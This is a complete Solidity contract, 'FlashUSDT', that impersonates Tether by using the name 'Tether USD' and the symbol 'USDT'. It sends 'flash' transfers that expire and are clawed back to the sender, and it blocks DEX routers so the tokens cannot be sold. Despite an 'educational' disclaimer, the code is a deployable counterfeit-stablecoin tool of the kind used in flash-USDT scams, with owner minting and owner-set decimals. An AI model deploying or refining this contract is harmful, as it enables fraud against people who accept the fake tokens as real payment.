// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title FlashUSDT (Tether USD mimic — Flash Transaction PoC)
 * @dev ERC20 token that mimics real USDT with flash-transaction mechanics:
 *
 *  CORE USDT MIMIC
 *      - Name: "Tether USD" / Symbol: "USDT"
 *      - Programmable decimals (default 6, owner-adjustable)
 *      - Mintable, Burnable, Pausable, Blacklist
 *
 *  FLASH TRANSACTION SYSTEM
 *      - Flash transfers with configurable expiry (auto-revert after TTL)
 *      - Owner can manually invalidate any flash transfer
 *      - Expired/invalidated flash balances revert to sender
 *
 *  QUOTA SYSTEM
 *      - Per-address spendable flash quota (owner-assigned)
 *      - Flash transfers deduct from sender's quota
 *
 *  GAS WALLET
 *      - Dedicated gas fee collection address
 *      - Configurable gas fee per flash transfer
 *
 *  DEX / SWAP BLOCKING
 *      - Blocked addresses (DEX routers, AMM pools) cannot receive tokens
 *      - Prevents flash tokens from being sold on exchanges
 *
 *  PROOF OF CONCEPT — FOR EDUCATIONAL / TESTING PURPOSES ONLY
 */
contract FlashUSDT is ERC20, ERC20Burnable, ERC20Pausable, Ownable {

    // ─── Dynamic decimals ───────────────────────────────────────
    uint8 private _decimalsValue;

    // ─── Blacklist ──────────────────────────────────────────────
    mapping(address => bool) private _blacklisted;

    // ─── DEX / Swap blocking ────────────────────────────────────
    mapping(address => bool) private _dexBlocked;

    // ─── Flash Transfer System ──────────────────────────────────
    struct FlashTransfer {
        address sender;
        address recipient;
        uint256 amount;
        uint256 expiresAt;     // block.timestamp after which this is invalid
        bool    invalidated;   // manually invalidated by owner
        bool    reclaimed;     // already clawed back
    }

    uint256 public flashIdCounter;
    mapping(uint256 => FlashTransfer) public flashTransfers;

    // Track flash-originated balance per address (not yet expired/reclaimed)
    mapping(address => uint256) public flashBalance;

    // Default time-to-live for flash transfers (seconds)
    uint256 public defaultFlashTTL;

    // ─── Quota System ───────────────────────────────────────────
    mapping(address => uint256) public flashQuota;      // total allowed
    mapping(address => uint256) public flashQuotaUsed;   // already spent

    // ─── Gas Wallet ─────────────────────────────────────────────
    address public gasWallet;
    uint256 public flashGasFee; // fee in token units per flash transfer

    // ─── Events ─────────────────────────────────────────────────
    event Blacklisted(address indexed account);
    event UnBlacklisted(address indexed account);
    event Mint(address indexed to, uint256 amount);
    event Destroy(address indexed from, uint256 amount);

    event DEXBlocked(address indexed account);
    event DEXUnblocked(address indexed account);

    event FlashSent(
        uint256 indexed flashId,
        address indexed sender,
        address indexed recipient,
        uint256 amount,
        uint256 expiresAt
    );
    event FlashInvalidated(uint256 indexed flashId);
    event FlashReclaimed(uint256 indexed flashId, uint256 amount);

    event QuotaSet(address indexed account, uint256 quota);
    event GasWalletUpdated(address indexed newWallet);
    event GasFeeUpdated(uint256 newFee);
    event DecimalsUpdated(uint8 newDecimals);

    // ─── Constructor ────────────────────────────────────────────

    constructor(
        uint256 initialSupply,
        uint256 _defaultFlashTTL,
        address _gasWallet,
        uint256 _flashGasFee
    ) ERC20("Tether USD", "USDT") Ownable(msg.sender) {
        _decimalsValue = 6;
        defaultFlashTTL = _defaultFlashTTL;
        gasWallet = _gasWallet;
        flashGasFee = _flashGasFee;
        _mint(msg.sender, initialSupply * 10 ** _decimalsValue);
    }

    // ─── Decimals (programmable) ────────────────────────────────

    function decimals() public view override returns (uint8) {
        return _decimalsValue;
    }

    function setDecimals(uint8 newDecimals) external onlyOwner {
        _decimalsValue = newDecimals;
        emit DecimalsUpdated(newDecimals);
    }

    // ─── Mint & Burn (owner only) ───────────────────────────────

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
        emit Mint(to, amount);
    }

    function destroy(address from, uint256 amount) external onlyOwner {
        _burn(from, amount);
        emit Destroy(from, amount);
    }

    // ─── Pause (owner only) ─────────────────────────────────────

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    // ─── Blacklist (owner only) ─────────────────────────────────

    function blacklist(address account) external onlyOwner {
        _blacklisted[account] = true;
        emit Blacklisted(account);
    }

    function unBlacklist(address account) external onlyOwner {
        _blacklisted[account] = false;
        emit UnBlacklisted(account);
    }

    function isBlacklisted(address account) external view returns (bool) {
        return _blacklisted[account];
    }

    // ─── DEX / Swap Blocking ────────────────────────────────────

    function blockDEX(address dexAddress) external onlyOwner {
        _dexBlocked[dexAddress] = true;
        emit DEXBlocked(dexAddress);
    }

    function unblockDEX(address dexAddress) external onlyOwner {
        _dexBlocked[dexAddress] = false;
        emit DEXUnblocked(dexAddress);
    }

    function isDEXBlocked(address account) external view returns (bool) {
        return _dexBlocked[account];
    }

    // ─── Gas Wallet ─────────────────────────────────────────────

    function setGasWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0), "FlashUSDT: zero address");
        gasWallet = newWallet;
        emit GasWalletUpdated(newWallet);
    }

    function setGasFee(uint256 newFee) external onlyOwner {
        flashGasFee = newFee;
        emit GasFeeUpdated(newFee);
    }

    // ─── Quota System ───────────────────────────────────────────

    function setQuota(address account, uint256 quota) external onlyOwner {
        flashQuota[account] = quota;
        emit QuotaSet(account, quota);
    }

    function remainingQuota(address account) external view returns (uint256) {
        if (flashQuota[account] <= flashQuotaUsed[account]) return 0;
        return flashQuota[account] - flashQuotaUsed[account];
    }

    // ─── Flash TTL ──────────────────────────────────────────────

    function setDefaultFlashTTL(uint256 ttl) external onlyOwner {
        defaultFlashTTL = ttl;
    }

    // ─── Flash Transfer (the core feature) ──────────────────────

    /**
     * @notice Send a flash transfer that auto-expires after `defaultFlashTTL`.
     *         Tokens appear in recipient's balance immediately but can be
     *         reclaimed after expiry or manual invalidation.
     * @param to        Recipient address
     * @param amount    Amount of tokens to flash-send
     * @return flashId  The ID of the flash transfer record
     */
    function flashTransfer(address to, uint256 amount) external returns (uint256) {
        return _flashTransfer(msg.sender, to, amount, defaultFlashTTL);
    }

    /**
     * @notice Flash transfer with a custom TTL (seconds).
     */
    function flashTransferWithTTL(
        address to,
        uint256 amount,
        uint256 ttl
    ) external returns (uint256) {
        return _flashTransfer(msg.sender, to, amount, ttl);
    }

    function _flashTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 ttl
    ) internal returns (uint256 flashId) {
        require(to != address(0), "FlashUSDT: transfer to zero address");
        require(amount > 0, "FlashUSDT: zero amount");
        require(!_dexBlocked[to], "FlashUSDT: recipient is DEX-blocked");
        require(!_blacklisted[from], "FlashUSDT: sender is blacklisted");
        require(!_blacklisted[to], "FlashUSDT: recipient is blacklisted");

        // Quota check
        require(
            flashQuota[from] == 0 || flashQuotaUsed[from] + amount <= flashQuota[from],
            "FlashUSDT: exceeds flash quota"
        );

        // Gas fee collection
        if (flashGasFee > 0 && gasWallet != address(0)) {
            require(balanceOf(from) >= amount + flashGasFee, "FlashUSDT: insufficient for amount + gas");
            _transfer(from, gasWallet, flashGasFee);
        }

        // Execute the actual token transfer
        _transfer(from, to, amount);

        // Record flash metadata
        flashId = flashIdCounter++;
        flashTransfers[flashId] = FlashTransfer({
            sender: from,
            recipient: to,
            amount: amount,
            expiresAt: block.timestamp + ttl,
            invalidated: false,
            reclaimed: false
        });

        flashBalance[to] += amount;

        // Track quota usage
        if (flashQuota[from] > 0) {
            flashQuotaUsed[from] += amount;
        }

        emit FlashSent(flashId, from, to, amount, block.timestamp + ttl);
    }

    // ─── Invalidation & Reclaim ─────────────────────────────────

    /**
     * @notice Owner manually invalidates a flash transfer (marks it for reclaim).
     */
    function invalidateFlash(uint256 flashId) external onlyOwner {
        FlashTransfer storage ft = flashTransfers[flashId];
        require(ft.amount > 0, "FlashUSDT: invalid flash ID");
        require(!ft.reclaimed, "FlashUSDT: already reclaimed");
        ft.invalidated = true;
        emit FlashInvalidated(flashId);
    }

    /**
     * @notice Check if a flash transfer is expired or invalidated.
     */
    function isFlashExpired(uint256 flashId) public view returns (bool) {
        FlashTransfer storage ft = flashTransfers[flashId];
        return ft.invalidated || block.timestamp >= ft.expiresAt;
    }

    /**
     * @notice Reclaim (claw back) tokens from an expired or invalidated flash.
     *         Anyone can call this, but tokens always go back to original sender.
     */
    function reclaimFlash(uint256 flashId) external {
        FlashTransfer storage ft = flashTransfers[flashId];
        require(ft.amount > 0, "FlashUSDT: invalid flash ID");
        require(!ft.reclaimed, "FlashUSDT: already reclaimed");
        require(
            ft.invalidated || block.timestamp >= ft.expiresAt,
            "FlashUSDT: flash not yet expired"
        );

        ft.reclaimed = true;
        uint256 clawAmount = ft.amount;

        // Reduce tracked flash balance
        if (flashBalance[ft.recipient] >= clawAmount) {
            flashBalance[ft.recipient] -= clawAmount;
        } else {
            flashBalance[ft.recipient] = 0;
        }

        // Claw back: transfer from recipient back to sender
        // If recipient spent the tokens, this will revert (intentional)
        _transfer(ft.recipient, ft.sender, clawAmount);

        emit FlashReclaimed(flashId, clawAmount);
    }

    /**
     * @notice Batch-reclaim all expired/invalidated flashes in a range.
     */
    function batchReclaim(uint256 fromId, uint256 toId) external {
        require(toId <= flashIdCounter, "FlashUSDT: toId out of range");
        for (uint256 i = fromId; i < toId; i++) {
            FlashTransfer storage ft = flashTransfers[i];
            if (
                ft.amount > 0 &&
                !ft.reclaimed &&
                (ft.invalidated || block.timestamp >= ft.expiresAt)
            ) {
                // Only reclaim if recipient still has enough balance
                if (balanceOf(ft.recipient) >= ft.amount) {
                    ft.reclaimed = true;
                    if (flashBalance[ft.recipient] >= ft.amount) {
                        flashBalance[ft.recipient] -= ft.amount;
                    } else {
                        flashBalance[ft.recipient] = 0;
                    }
                    _transfer(ft.recipient, ft.sender, ft.amount);
                    emit FlashReclaimed(i, ft.amount);
                }
            }
        }
    }

    // ─── View Helpers ───────────────────────────────────────────

    /**
     * @notice Returns the "real" (non-flash) balance of an address.
     *         realBalance = totalBalance - activeFlashBalance
     */
    function realBalance(address account) external view returns (uint256) {
        uint256 total = balanceOf(account);
        uint256 flash = flashBalance[account];
        return total > flash ? total - flash : 0;
    }

    /**
     * @notice Get flash transfer details.
     */
    function getFlashTransfer(uint256 flashId)
        external
        view
        returns (
            address sender,
            address recipient,
            uint256 amount,
            uint256 expiresAt,
            bool invalidated,
            bool reclaimed,
            bool expired
        )
    {
        FlashTransfer storage ft = flashTransfers[flashId];
        return (
            ft.sender,
            ft.recipient,
            ft.amount,
            ft.expiresAt,
            ft.invalidated,
            ft.reclaimed,
            isFlashExpired(flashId)
        );
    }

    // ─── Transfer hooks (blacklist + DEX block enforcement) ─────

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override(ERC20, ERC20Pausable) {
        require(!_blacklisted[from], "FlashUSDT: sender is blacklisted");
        require(!_blacklisted[to], "FlashUSDT: recipient is blacklisted");
        // Block sends to DEX routers / AMM pools (prevents swap/sell)
        if (from != address(0) && to != address(0)) {
            require(!_dexBlocked[to], "FlashUSDT: cannot send to DEX/AMM");
            require(!_dexBlocked[from], "FlashUSDT: cannot receive from DEX/AMM");
        }
        super._update(from, to, value);
    }
}
